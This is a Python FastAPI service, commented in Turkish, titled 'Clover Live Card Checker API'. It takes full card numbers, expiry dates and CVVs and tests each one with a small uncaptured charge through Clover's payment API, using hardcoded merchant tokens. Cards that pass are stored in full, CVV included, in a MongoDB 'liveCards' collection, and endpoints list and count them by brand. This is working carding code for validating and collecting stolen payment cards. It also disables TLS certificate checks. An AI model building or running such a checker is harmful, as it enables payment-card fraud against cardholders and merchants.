from fastapi import FastAPI, Depends, HTTPException, Security, status
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from pydantic import BaseModel, Field
from typing import Dict, List, Optional, Any
from datetime import datetime
import requests
import re
import time
import random
import hashlib
import json
import os
import logging
from pymongo import MongoClient

# ================== LOGGING ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="Clover Live Card Checker API",
    description="Clover ile Kart Doğrulama API'si",
    version="2.0.0"
)
security = HTTPBearer()

# ================== AUTH ==================
AUTH_TOKEN = os.getenv("AUTH_TOKEN", "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025")

def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
    if credentials.credentials != AUTH_TOKEN:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Geçersiz token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    return credentials.credentials

# ================== MONGODB ==================
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger")

try:
    client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["paymentmanger"]
    live_cards_collection = db["liveCards"]
    logger.info("[+] MongoDB bağlantısı başarılı")
except Exception as e:
    logger.error(f"[!] MongoDB hatası: {e}")
    client = None
    live_cards_collection = None

# ================== MODELS ==================
class CardCheckRequest(BaseModel):
    card: Optional[str] = Field(None, description="Kart string'i (PAN|MM/YY|CVV)", example="4514011614153896|07/2026|234")
    pan: Optional[str] = Field(None, description="Kart numarası", example="4514011614153896")
    exp: Optional[str] = Field(None, description="Son kullanma tarihi (MM/YYYY)", example="07/2026")
    cvv: Optional[str] = Field(None, description="CVV kodu", example="234")
    zip: Optional[str] = Field("00000", description="Posta kodu", example="10001")
    holderName: Optional[str] = Field(None, description="Kart sahibi adı", example="John Doe")

class CardCheckResponse(BaseModel):
    status: str = Field(..., description="Durum: live / dead / error")
    message: str = Field(..., description="Sonuç mesajı")
    card: Dict = Field(..., description="Kart bilgileri")
    binInfo: Optional[Dict] = Field(None, description="BIN bilgileri")
    verification: Optional[Dict] = Field(None, description="Doğrulama sonucu")
    dbSaved: bool = Field(False, description="Veritabanına kaydedildi mi?")
    timestamp: str = Field(..., description="İşlem zamanı")

# ================== CLOVER CONFIG ==================
CLOVER_CONFIG = {
    "merchant_id": os.getenv("CLOVER_MERCHANT_ID", "518993421163932"),
    "public_token": os.getenv("CLOVER_PUBLIC_TOKEN", "cc5f1f800dad9399d3e46aca8da49d8f"),
    "private_token": os.getenv("CLOVER_PRIVATE_TOKEN", "c7ee250b-e9ae-ab59-ba52-616ecc63ed29"),
    "token_url": "https://token.clover.com/v1/tokens",
    "charge_url": "https://api.clover.com/v1/charges"
}

MOCK_MODE = os.getenv("MOCK_MODE", "false").lower() in ["1", "true", "yes", "on"]

# ================== HELPER FUNCTIONS ==================

def digits_only(value: Any) -> str:
    if value is None:
        return ""
    return re.sub(r'\D', '', str(value))

def mask_pan(pan: str) -> str:
    if not pan or len(pan) < 10:
        return pan
    return f"{pan[:6]}****{pan[-4:]}"

def normalize_expiry(exp: str) -> Optional[Dict]:
    exp = exp.strip()
    if '/' not in exp:
        return None
    parts = exp.split('/')
    if len(parts) != 2:
        return None
    month = parts[0].strip().zfill(2)
    year = parts[1].strip()
    if len(year) == 2:
        year = f"20{year}"
    elif len(year) != 4:
        return None
    if not re.match(r'^(0[1-9]|1[0-2])$', month):
        return None
    return {"month": month, "year": year, "expiry": f"{month}/{year}"}

def parse_card_string(card_str: str) -> Optional[Dict]:
    parts = card_str.strip().split('|')
    if len(parts) < 3:
        return None
    pan = parts[0].strip()
    if not pan or len(pan) < 13 or len(pan) > 19:
        return None
    expiry = None
    cvv = None
    for i, part in enumerate(parts[1:], 1):
        part = part.strip()
        if '/' in part:
            exp_parts = part.split('/')
            if len(exp_parts) == 2:
                month = exp_parts[0].strip().zfill(2)
                year = exp_parts[1].strip()
                if len(year) == 2:
                    year = f"20{year}"
                expiry = f"{month}/{year}"
                if i < len(parts):
                    next_part = parts[i+1].strip()
                    if next_part.isdigit() and len(next_part) in [3, 4]:
                        cvv = next_part
                break
        if part.isdigit() and len(part) in [3, 4] and not cvv:
            cvv = part
            continue
        if part.isdigit() and len(part) in [1, 2] and not expiry:
            if i < len(parts):
                next_part = parts[i+1].strip()
                if next_part.isdigit() and len(next_part) in [2, 4]:
                    month = part.zfill(2)
                    year = next_part
                    if len(year) == 2:
                        year = f"20{year}"
                    expiry = f"{month}/{year}"
                    if i + 1 < len(parts):
                        cvv_part = parts[i+2].strip()
                        if cvv_part.isdigit() and len(cvv_part) in [3, 4]:
                            cvv = cvv_part
                    break
    if not expiry or not cvv:
        return None
    return {
        "pan": pan,
        "expiry": expiry,
        "cvv": cvv,
        "month": expiry.split('/')[0],
        "year": expiry.split('/')[1]
    }

def parse_input(request: CardCheckRequest) -> Optional[Dict]:
    if request.card:
        parsed = parse_card_string(request.card)
        if parsed:
            return parsed
    if request.pan and request.exp and request.cvv:
        pan = digits_only(request.pan)
        if len(pan) < 13 or len(pan) > 19:
            return None
        expiry_info = normalize_expiry(request.exp)
        if not expiry_info:
            return None
        cvv = digits_only(request.cvv)
        if len(cvv) < 3 or len(cvv) > 4:
            return None
        return {
            "pan": pan,
            "expiry": expiry_info["expiry"],
            "cvv": cvv,
            "month": expiry_info["month"],
            "year": expiry_info["year"]
        }
    return None

# ================== BIN LOOKUP ==================
class BinLookup:
    def __init__(self):
        self.cache = {}
        self.binlist_url = "https://lookup.binlist.net/"
    
    def get_bin_info(self, bin_number: str) -> Dict:
        bin_6 = digits_only(bin_number)[:6]
        if bin_6 in self.cache:
            return self.cache[bin_6]
        result = {
            "bin": bin_6,
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "STANDARD",
            "bank": "Unknown",
            "country": "XX",
            "country_name": "Unknown",
            "currency": "USD",
            "valid": False
        }
        try:
            r = requests.get(f"{self.binlist_url}{bin_6}", timeout=10, headers={"Accept-Version": "3"})
            if r.status_code == 200:
                data = r.json()
                bank = data.get("bank", {})
                country = data.get("country", {})
                brand = data.get("scheme", "UNKNOWN").upper()
                brand_name = data.get("brand", "").upper()
                card_type = data.get("type", "UNKNOWN").upper()
                level = "STANDARD"
                if "PLATINUM" in brand_name:
                    level = "PLATINUM"
                elif "GOLD" in brand_name:
                    level = "GOLD"
                elif "SIGNATURE" in brand_name:
                    level = "SIGNATURE"
                elif "INFINITE" in brand_name:
                    level = "INFINITE"
                elif "WORLD" in brand_name:
                    level = "WORLD"
                elif "BUSINESS" in brand_name:
                    level = "BUSINESS"
                result.update({
                    "brand": brand,
                    "type": card_type,
                    "level": level,
                    "bank": bank.get("name", "Unknown"),
                    "country": country.get("alpha2", "XX"),
                    "country_name": country.get("name", "Unknown"),
                    "currency": country.get("currency", "USD"),
                    "valid": True
                })
        except Exception as e:
            logger.warning(f"[BIN] Hata: {e}")
        self.cache[bin_6] = result
        return result

bin_lookup = BinLookup()

# ================== CLOVER VERIFY ==================

def clover_verify_card(card_data: Dict) -> Dict:
    if MOCK_MODE:
        is_live = random.random() < 0.15
        return {
            "status": "approved" if is_live else "declined",
            "transactionId": f"mock_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}",
            "provider": "clover",
            "isLive": is_live,
            "mock": True
        }
    try:
        token_payload = {
            "card": {
                "number": card_data["pan"],
                "exp_month": int(card_data["month"]),
                "exp_year": int(card_data["year"]),
                "cvv": card_data["cvv"]
            }
        }
        token_headers = {
            "Content-Type": "application/json",
            "apikey": CLOVER_CONFIG["public_token"]
        }
        token_response = requests.post(
            CLOVER_CONFIG["token_url"],
            json=token_payload,
            headers=token_headers,
            timeout=15
        )
        if token_response.status_code != 200:
            return {
                "status": "error",
                "isLive": False,
                "error": f"Tokenization failed: HTTP {token_response.status_code}"
            }
        token_data = token_response.json()
        token_id = token_data.get("id")
        if not token_id:
            return {
                "status": "error",
                "isLive": False,
                "error": "No token received"
            }
        charge_payload = {
            "amount": 50,
            "currency": "usd",
            "source": token_id,
            "capture": False
        }
        charge_headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {CLOVER_CONFIG['private_token']}"
        }
        charge_response = requests.post(
            CLOVER_CONFIG["charge_url"],
            json=charge_payload,
            headers=charge_headers,
            timeout=15
        )
        if charge_response.status_code in [200, 201, 202]:
            charge_data = charge_response.json()
            is_live = charge_data.get("status") in ["succeeded", "approved", "authorized"]
            return {
                "status": "approved" if is_live else "declined",
                "transactionId": charge_data.get("id", ""),
                "provider": "clover",
                "isLive": is_live,
                "token": token_id
            }
        return {
            "status": "error",
            "isLive": False,
            "error": f"Charge failed: HTTP {charge_response.status_code}"
        }
    except Exception as e:
        logger.error(f"[CLOVER] Hata: {e}")
        return {
            "status": "error",
            "isLive": False,
            "error": str(e)
        }

# ================== SAVE TO MONGODB ==================

def save_to_mongodb(card_data: Dict, bin_info: Dict, verification: Dict) -> Dict:
    if not live_cards_collection:
        return {"saved": False, "error": "MongoDB not connected"}
    doc = {
        "pan": card_data["pan"],
        "masked": mask_pan(card_data["pan"]),
        "expiry": card_data["expiry"],
        "month": card_data["month"],
        "year": card_data["year"],
        "cvv": card_data["cvv"],
        "zip": card_data.get("zip", "00000"),
        "holderName": card_data.get("holderName", ""),
        "brand": bin_info.get("brand", "UNKNOWN"),
        "type": bin_info.get("type", "UNKNOWN"),
        "level": bin_info.get("level", "STANDARD"),
        "bank": bin_info.get("bank", "Unknown"),
        "country": bin_info.get("country", "XX"),
        "country_name": bin_info.get("country_name", "Unknown"),
        "currency": bin_info.get("currency", "USD"),
        "bin": bin_info.get("bin", ""),
        "transactionId": verification.get("transactionId", ""),
        "provider": verification.get("provider", "clover"),
        "status": verification.get("status", "unknown"),
        "isLive": True,
        "verifiedAt": datetime.now().isoformat()
    }
    try:
        result = live_cards_collection.insert_one(doc)
        logger.info(f"[DB] Kart kaydedildi: {doc['masked']}")
        return {"saved": True, "id": str(result.inserted_id)}
    except Exception as e:
        logger.error(f"[DB] Kayıt hatası: {e}")
        return {"saved": False, "error": str(e)}

# ================== MAIN CHECK FUNCTION ==================

def check_card(request: CardCheckRequest) -> CardCheckResponse:
    parsed = parse_input(request)
    if not parsed:
        return CardCheckResponse(
            status="error",
            message="Geçersiz kart formatı",
            card={"input": request.card or request.pan or "invalid"},
            binInfo=None,
            verification=None,
            dbSaved=False,
            timestamp=datetime.now().isoformat()
        )
    pan = parsed["pan"]
    expiry = parsed["expiry"]
    month = parsed["month"]
    year = parsed["year"]
    cvv = parsed["cvv"]
    zip_code = digits_only(request.zip) or "00000"
    if len(zip_code) < 5:
        zip_code = "00000"
    card_data = {
        "pan": pan,
        "month": month,
        "year": year,
        "expiry": expiry,
        "cvv": cvv,
        "zip": zip_code,
        "holderName": request.holderName or ""
    }
    card_response = {
        "pan": pan,
        "masked": mask_pan(pan),
        "expiry": expiry,
        "cvv": cvv,
        "zip": zip_code,
        "holderName": request.holderName or ""
    }
    verification = clover_verify_card(card_data)
    is_live = verification.get("isLive", False)
    if is_live:
        bin_info = bin_lookup.get_bin_info(pan)
        save_result = save_to_mongodb(card_data, bin_info, verification)
        return CardCheckResponse(
            status="live",
            message="Kart doğrulandı ve live olarak kaydedildi",
            card=card_response,
            binInfo=bin_info,
            verification=verification,
            dbSaved=save_result.get("saved", False),
            timestamp=datetime.now().isoformat()
        )
    return CardCheckResponse(
        status="dead",
        message=f"Kart geçersiz: {verification.get('error', 'Doğrulama başarısız')}",
        card=card_response,
        binInfo=None,
        verification=verification,
        dbSaved=False,
        timestamp=datetime.now().isoformat()
    )

# ================== API ENDPOINTS ==================

@app.get("/")
async def root():
    return {
        "name": "Clover Live Card Checker API",
        "version": "2.0.0",
        "status": "active",
        "mock_mode": MOCK_MODE,
        "endpoints": [
            {"path": "/docs", "method": "GET", "description": "Swagger dokümantasyonu"},
            {"path": "/health", "method": "GET", "description": "Sağlık kontrolü"},
            {"path": "/check", "method": "POST", "description": "Kart doğrulama"},
            {"path": "/cards/live", "method": "GET", "description": "Live kartları listele"},
            {"path": "/cards/stats", "method": "GET", "description": "Live kart istatistikleri"}
        ]
    }

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "mock_mode": MOCK_MODE,
        "mongodb": live_cards_collection is not None,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/check")
async def check_single_card(
    request: CardCheckRequest,
    auth: str = Depends(verify_auth)
):
    try:
        result = check_card(request)
        return result
    except Exception as e:
        logger.error(f"[API] Hata: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/cards/live")
async def list_live_cards(
    limit: int = 50,
    brand: Optional[str] = None,
    auth: str = Depends(verify_auth)
):
    if not live_cards_collection:
        raise HTTPException(status_code=503, detail="MongoDB bağlantısı yok")
    query = {"isLive": True}
    if brand:
        query["brand"] = brand.upper()
    try:
        cursor = live_cards_collection.find(query).sort("verifiedAt", -1).limit(limit)
        cards = []
        for doc in cursor:
            doc["_id"] = str(doc["_id"])
            cards.append(doc)
        return {"total": len(cards), "cards": cards}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/cards/stats")
async def card_statistics(
    auth: str = Depends(verify_auth)
):
    if not live_cards_collection:
        raise HTTPException(status_code=503, detail="MongoDB bağlantısı yok")
    try:
        total = live_cards_collection.count_documents({"isLive": True})
        brand_stats = live_cards_collection.aggregate([
            {"$match": {"isLive": True}},
            {"$group": {"_id": "$brand", "count": {"$sum": 1}}}
        ])
        brands = {}
        for item in brand_stats:
            brands[item["_id"]] = item["count"]
        return {
            "totalLiveCards": total,
            "brands": brands,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=10000)